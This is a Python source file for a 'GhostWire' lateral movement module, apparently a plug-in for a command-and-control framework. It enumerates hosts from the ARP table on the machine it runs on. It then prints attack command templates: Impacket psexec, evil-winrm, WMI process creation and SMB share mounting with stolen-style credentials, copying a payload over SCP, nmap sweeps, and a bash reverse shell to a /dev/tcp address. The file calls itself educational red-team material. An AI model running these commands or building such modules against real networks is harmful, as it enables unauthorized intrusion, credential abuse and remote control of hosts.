"""
GhostWire Lateral Movement Module
=================================

This module provides tools for network reconnaissance and demonstrates
lateral movement techniques used to expand access across a network.
It includes host discovery and example movement commands.

Lateral Movement Techniques:
- Network reconnaissance and host discovery
- Credential-based lateral movement
- Tool-based movement (PsExec, SSH, WinRM)
- File transfer and execution methods

Reconnaissance Capabilities:
- ARP table analysis for host discovery
- Network topology mapping
- Service enumeration examples

Security Considerations:
- This module is for authorized testing and educational purposes
- Lateral movement requires proper credentials and permissions
- Examples demonstrate common techniques used in red teaming
- Understanding these methods helps improve network security

Usage:
    module lateral

Note: This module provides educational examples of lateral movement
techniques. The commands shown are templates that require proper
credentials and tools to execute successfully.
"""
import platform
import subprocess
import io
import sys

class Lateral:
    """
    Tools for network reconnaissance and example lateral movement techniques.
    
    This class provides methods for discovering hosts on the network and
    demonstrates common lateral movement techniques used in red teaming
    operations. It includes both reconnaissance and movement examples.
    
    Usage: module lateral
    """
    
    @staticmethod
    def _discover_hosts():
        """
        Discover hosts on the local network using ARP table analysis.
        
        This method uses the ARP table to identify hosts that have been
        in communication with the current system. This provides a basic
        view of the local network topology.
        
        Returns:
            str: Formatted output containing discovered hosts
        """
        output = ""
        try:
            # Use ARP command to discover hosts
            cmd = 'arp -a'
            output += f"[+] Running host discovery command: '{cmd}'\n"
            
            # Execute the command and capture output
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
            output += result
            
        except Exception as e:
            output += f"[-] Host discovery failed. The 'arp' command may not be available or failed to run.\nError: {e}\n"
            
        return output

    @staticmethod
    def run_remote(args):
        """
        Main entry point for the lateral movement module.
        
        This method is called by the C2 framework when the module is executed.
        It performs network reconnaissance and provides examples of lateral
        movement techniques for educational purposes.
        
        Args:
            args: Command-line arguments (not used in this module)
            
        Returns:
            str: Complete output from reconnaissance and movement examples
        """
        # Capture stdout to return as string
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Running Lateral Movement reconnaissance on {platform.system()}...")
            
            # Perform host discovery
            print("\n--- Host Discovery (ARP Table) ---")
            print(Lateral._discover_hosts())
            
            # Provide lateral movement examples
            print("\n--- Example Lateral Movement Commands ---")
            print("[!] The following are templates for manual execution with proper tools and credentials.")
            
            # Platform-specific lateral movement techniques
            if platform.system() == "Windows":
                print("\nWindows Lateral Movement Examples:")
                print("  - PsExec (Impacket): python psexec.py <domain>/<user>@<target_ip> 'whoami'")
                print("  - WinRM (evil-winrm): evil-winrm -i <target_ip> -u <user> -p <password>")
                print("  - WMI: wmic /node:<target_ip> /user:<domain>\\<user> /password:<password> process call create 'cmd.exe /c whoami'")
                print("  - SMB: net use \\\\<target_ip>\\C$ /user:<domain>\\<user> <password>")
                print("  - RDP: mstsc /v:<target_ip> /u:<user> /p:<password>")
                
            else:
                print("\nLinux/Unix Lateral Movement Examples:")
                print("  - SSH: ssh <user>@<target_ip> 'id'")
                print("  - SCP: scp /path/to/payload <user>@<target_ip>:/tmp/payload")
                print("  - SSH Key-based: ssh -i /path/to/key <user>@<target_ip>")
                print("  - Sudo: ssh <user>@<target_ip> 'sudo -u root whoami'")
                print("  - Reverse Shell: ssh <user>@<target_ip> 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'")
            
            # Additional reconnaissance techniques
            print("\n--- Additional Reconnaissance Commands ---")
            print("Network scanning and enumeration:")
            print("  - nmap -sn <network_range> (ping sweep)")
            print("  - nmap -sS -p 22,80,443,3389 <target_ip> (port scan)")
            print("  - netstat -an (local connections)")
            print("  - arp -a (ARP table)")
            print("  - route print (Windows) / route -n (Linux)")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            # Restore stdout
            sys.stdout = old_stdout
            
        return captured_output.getvalue()